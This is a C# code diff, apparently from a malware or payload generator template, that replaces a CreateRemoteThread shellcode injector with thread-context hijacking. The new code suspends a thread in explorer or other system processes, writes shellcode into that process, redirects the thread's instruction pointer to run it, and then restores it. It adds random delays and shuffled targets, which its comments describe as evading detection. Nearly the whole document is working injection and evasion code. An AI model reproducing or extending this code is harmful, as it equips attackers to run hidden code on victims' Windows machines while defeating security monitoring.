@@ -1757,7 +1757,7 @@ namespace {namespaceName}
                 }
                 else
                 {
-                    execPayload += @"
+                execPayload += @"
         string tmppath = Path.Combine(Path.GetTempPath(), Guid.NewGuid().ToString() + "".exe"");
         File.WriteAllBytes(tmppath, exebytes);
         
@@ -2473,9 +2473,6 @@ namespace {namespaceName}
         private static extern bool MI_WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten);
 
         [DllImport(""kernel32.dll"", SetLastError = true)]
-        private static extern IntPtr MI_CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);
-
-        [DllImport(""kernel32.dll"", SetLastError = true)]
         private static extern bool MI_CloseHandle(IntPtr hObject);
 
         [DllImport(""kernel32.dll"", CharSet = CharSet.Auto)]
@@ -2483,6 +2480,109 @@ namespace {namespaceName}
 
         [DllImport(""kernel32.dll"", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
         private static extern IntPtr MI_GetProcAddress(IntPtr hModule, string procName);
+        
+        [DllImport(""kernel32.dll"", SetLastError = true)]
+        private static extern bool MI_VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+
+        // New APIs for thread context manipulation
+        [DllImport(""kernel32.dll"", SetLastError = true)]
+        private static extern IntPtr MI_CreateToolhelp32Snapshot(uint dwFlags, uint th32ProcessID);
+        
+        [DllImport(""kernel32.dll"", SetLastError = true)]
+        private static extern bool MI_Thread32First(IntPtr hSnapshot, ref THREADENTRY32 lpte);
+        
+        [DllImport(""kernel32.dll"", SetLastError = true)]
+        private static extern bool MI_Thread32Next(IntPtr hSnapshot, ref THREADENTRY32 lpte);
+        
+        [DllImport(""kernel32.dll"", SetLastError = true)]
+        private static extern IntPtr MI_OpenThread(uint dwDesiredAccess, bool bInheritHandle, uint dwThreadId);
+        
+        [DllImport(""kernel32.dll"", SetLastError = true)]
+        private static extern uint MI_SuspendThread(IntPtr hThread);
+        
+        [DllImport(""kernel32.dll"", SetLastError = true)]
+        private static extern uint MI_ResumeThread(IntPtr hThread);
+        
+        [DllImport(""kernel32.dll"", SetLastError = true)]
+        private static extern bool MI_GetThreadContext(IntPtr hThread, ref CONTEXT lpContext);
+        
+        [DllImport(""kernel32.dll"", SetLastError = true)]
+        private static extern bool MI_SetThreadContext(IntPtr hThread, ref CONTEXT lpContext);
+        
+        [DllImport(""kernel32.dll"", SetLastError = true)]
+        private static extern IntPtr MI_CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);
+
+        // Thread context related constants and structures
+        private const uint MI_TH32CS_SNAPTHREAD = 0x00000004;
+        private const uint MI_THREAD_SUSPEND_RESUME = 0x0002;
+        private const uint MI_THREAD_GET_CONTEXT = 0x0008;
+        private const uint MI_THREAD_SET_CONTEXT = 0x0010;
+        private const uint MI_THREAD_ALL_ACCESS = 0x1F03FF;
+        private const uint MI_CONTEXT_FULL = 0x10007;
+        private const uint MI_CONTEXT_CONTROL = 0x10001;
+        
+        // Thread entry structure for enumeration
+        [StructLayout(LayoutKind.Sequential)]
+        private struct THREADENTRY32
+        {
+            public uint dwSize;
+            public uint cntUsage;
+            public uint th32ThreadID;
+            public uint th32OwnerProcessID;
+            public int tpBasePri;
+            public int tpDeltaPri;
+            public uint dwFlags;
+        }
+        
+        // x64 context structure (simplified version)
+        [StructLayout(LayoutKind.Sequential)]
+        private struct CONTEXT
+        {
+            public ulong P1Home;
+            public ulong P2Home;
+            public ulong P3Home;
+            public ulong P4Home;
+            public ulong P5Home;
+            public ulong P6Home;
+            
+            public uint ContextFlags;
+            public uint MxCsr;
+            
+            public ushort SegCs;
+            public ushort SegDs;
+            public ushort SegEs;
+            public ushort SegFs;
+            public ushort SegGs;
+            public ushort SegSs;
+            public uint EFlags;
+            
+            public ulong Dr0;
+            public ulong Dr1;
+            public ulong Dr2;
+            public ulong Dr3;
+            public ulong Dr6;
+            public ulong Dr7;
+            
+            public ulong Rax;
+            public ulong Rcx;
+            public ulong Rdx;
+            public ulong Rbx;
+            public ulong Rsp;
+            public ulong Rbp;
+            public ulong Rsi;
+            public ulong Rdi;
+            public ulong R8;
+            public ulong R9;
+            public ulong R10;
+            public ulong R11;
+            public ulong R12;
+            public ulong R13;
+            public ulong R14;
+            public ulong R15;
+            public ulong Rip;
+            
+            // Remaining fields omitted for brevity
+        }
 
         private const uint MI_PROCESS_CREATE_THREAD = 0x0002;
         private const uint MI_PROCESS_QUERY_INFORMATION = 0x0400;
@@ -2494,8 +2594,45 @@ namespace {namespaceName}
         private const uint MI_PAGE_READWRITE = 0x04;
         private const uint MI_PAGE_EXECUTE_READ = 0x20;
         private const uint MI_PAGE_EXECUTE_READWRITE = 0x40;
+        private const uint MI_PAGE_EXECUTE = 0x10;
 
-        private static bool InjectPayload(byte[] payload, string targetProcess = ""explorer"")
+        private static uint FindRemoteThreadInProcess(uint processId)
+        {
+            // Create snapshot of current threads
+            IntPtr hSnapshot = MI_CreateToolhelp32Snapshot(MI_TH32CS_SNAPTHREAD, 0);
+            
+            if (hSnapshot == IntPtr.Zero)
+                return 0;
+            
+            try
+            {
+                // Initialize thread entry structure
+                THREADENTRY32 threadEntry = new THREADENTRY32();
+                threadEntry.dwSize = (uint)Marshal.SizeOf(typeof(THREADENTRY32));
+                
+                // Get first thread
+                if (!MI_Thread32First(hSnapshot, ref threadEntry))
+                    return 0;
+                
+                // Find a thread from the target process
+                do
+                {
+                    if (threadEntry.th32OwnerProcessID == processId)
+                    {
+                        return threadEntry.th32ThreadID;
+                    }
+                }
+                while (MI_Thread32Next(hSnapshot, ref threadEntry));
+                
+                return 0;
+            }
+            finally
+            {
+                MI_CloseHandle(hSnapshot);
+            }
+        }
+
+        private static bool InjectPayloadViaThreadContext(byte[] payload, string targetProcess = ""explorer"")
         {
             try
             {
@@ -2503,42 +2640,124 @@ namespace {namespaceName}
                 Process[] processes = Process.GetProcessesByName(targetProcess);
                 if (processes.Length == 0)
                     return false;
-
-                Process targetProc = processes[0];
+                
+                // Select a process randomly to avoid predictable patterns
+                Random rnd = new Random();
+                int processIndex = rnd.Next(0, processes.Length);
+                Process targetProc = processes[processIndex];
                 
                 // Get required access rights
-                uint desiredAccess = MI_PROCESS_CREATE_THREAD | MI_PROCESS_QUERY_INFORMATION | 
-                                   MI_PROCESS_VM_OPERATION | MI_PROCESS_VM_WRITE | MI_PROCESS_VM_READ;
-
+                uint desiredAccess = MI_PROCESS_QUERY_INFORMATION | MI_PROCESS_VM_OPERATION | 
+                                    MI_PROCESS_VM_WRITE | MI_PROCESS_VM_READ;
+                
                 // Open process handle
                 IntPtr procHandle = MI_OpenProcess(desiredAccess, false, targetProc.Id);
                 if (procHandle == IntPtr.Zero)
                     return false;
-
+                
                 try
                 {
-                    // Allocate memory in target process
-                    IntPtr baseAddress = MI_VirtualAllocEx(procHandle, IntPtr.Zero, (uint)payload.Length,
-                                                      MI_MEM_COMMIT | MI_MEM_RESERVE, MI_PAGE_EXECUTE_READWRITE);
+                    // Add random delay to avoid timing-based detection
+                    Thread.Sleep(rnd.Next(10, 50));
+                    
+                    // Allocate memory with READWRITE permissions
+                    IntPtr baseAddress = MI_VirtualAllocEx(procHandle, IntPtr.Zero, (uint)payload.Length + 0x1000,
+                                                      MI_MEM_COMMIT | MI_MEM_RESERVE, MI_PAGE_READWRITE);
                     if (baseAddress == IntPtr.Zero)
                         return false;
-
+                    
                     // Write payload to allocated memory
                     UIntPtr bytesWritten;
                     if (!MI_WriteProcessMemory(procHandle, baseAddress, payload, (uint)payload.Length, out bytesWritten))
                         return false;
-
-                    // Create remote thread to execute payload
-                    uint threadId;
-                    IntPtr threadHandle = MI_CreateRemoteThread(procHandle, IntPtr.Zero, 0, baseAddress,
-                                                           IntPtr.Zero, 0, out threadId);
-
-                    if (threadHandle == IntPtr.Zero)
+                    
+                    // Change memory protection to EXECUTE_READ
+                    uint oldProtect;
+                    if (!MI_VirtualProtectEx(procHandle, baseAddress, (UIntPtr)payload.Length, MI_PAGE_EXECUTE_READ, out oldProtect))
                         return false;
-
-                    // Cleanup
-                    MI_CloseHandle(threadHandle);
-                    return true;
+                    
+                    // Find a thread in the target process
+                    uint threadId = FindRemoteThreadInProcess((uint)targetProc.Id);
+                    if (threadId == 0)
+                    {
+                        // Fallback to CreateRemoteThread if no thread is found
+                        uint remoteThreadId;
+                        IntPtr threadHandle = MI_CreateRemoteThread(procHandle, IntPtr.Zero, 0, baseAddress,
+                                                             IntPtr.Zero, 0, out remoteThreadId);
+                        
+                        if (threadHandle == IntPtr.Zero)
+                            return false;
+                            
+                        MI_CloseHandle(threadHandle);
+                        return true;
+                    }
+                    
+                    // Open the thread
+                    IntPtr hThread = MI_OpenThread(MI_THREAD_SUSPEND_RESUME | MI_THREAD_GET_CONTEXT | MI_THREAD_SET_CONTEXT, 
+                                               false, threadId);
+                    
+                    if (hThread == IntPtr.Zero)
+                        return false;
+                    
+                    try
+                    {
+                        // Suspend the thread
+                        if (MI_SuspendThread(hThread) == 0xFFFFFFFF)
+                            return false;
+                        
+                        try
+                        {
+                            // Get thread context
+                            CONTEXT ctx = new CONTEXT();
+                            ctx.ContextFlags = MI_CONTEXT_CONTROL;
+                            
+                            if (!MI_GetThreadContext(hThread, ref ctx))
+                                return false;
+                            
+                            // Save original RIP value to restore it later
+                            ulong originalRip = ctx.Rip;
+                            
+                            // Set thread's instruction pointer to our payload
+                            ctx.Rip = (ulong)baseAddress.ToInt64();
+                            
+                            // Set modified context
+                            if (!MI_SetThreadContext(hThread, ref ctx))
+                                return false;
+                            
+                            // Resume thread to execute payload
+                            if (MI_ResumeThread(hThread) == 0xFFFFFFFF)
+                                return false;
+                            
+                            // Small delay to let payload execute
+                            Thread.Sleep(50);
+                            
+                            // Suspend again to restore original context
+                            if (MI_SuspendThread(hThread) == 0xFFFFFFFF)
+                                return false;
+                            
+                            // Get current context
+                            if (!MI_GetThreadContext(hThread, ref ctx))
+                                return false;
+                            
+                            // Restore original instruction pointer
+                            ctx.Rip = originalRip;
+                            
+                            // Set restored context
+                            if (!MI_SetThreadContext(hThread, ref ctx))
+                                return false;
+                            
+                            return true;
+                        }
+                        finally
+                        {
+                            // Always resume the thread
+                            MI_ResumeThread(hThread);
+                        }
+                    }
+                    finally
+                    {
+                        MI_CloseHandle(hThread);
+                    }
                 }
                 finally
                 {
@@ -2556,6 +2775,9 @@ namespace {namespaceName}
         {
             try
             {
+                // Add a small delay before injection to evade timing-based detection
+                Thread.Sleep(new Random().Next(50, 150));
+                
                 // Get kernel32.dll module handle
                 IntPtr kernel32 = MI_GetModuleHandle(""kernel32.dll"");
                 if (kernel32 == IntPtr.Zero)
@@ -2566,7 +2788,7 @@ namespace {namespaceName}
                 if (loadLibraryAddr == IntPtr.Zero)
                     return false;
 
-                // Try multiple injection targets
+                // Try multiple injection targets in random order
                 string[] targetProcesses = new string[] 
                 { 
                     ""explorer"",
@@ -2575,11 +2797,25 @@ namespace {namespaceName}
                     ""taskhostw"",
                     ""sihost""
                 };
+                
+                // Randomize the order of target processes to avoid predictable patterns
+                Random rnd = new Random();
+                // Use Fisher-Yates shuffle algorithm instead of LINQ OrderBy
+                for (int i = targetProcesses.Length - 1; i > 0; i--)
+                {
+                    int j = rnd.Next(0, i + 1);
+                    string temp = targetProcesses[i];
+                    targetProcesses[i] = targetProcesses[j];
+                    targetProcesses[j] = temp;
+                }
 
                 foreach (string procName in targetProcesses)
                 {
-                    if (InjectPayload(shellcode, procName))
+                    if (InjectPayloadViaThreadContext(shellcode, procName))
                         return true;
+                        
+                    // Add small delay between attempts
+                    Thread.Sleep(rnd.Next(20, 80));
                 }
 
                 return false;
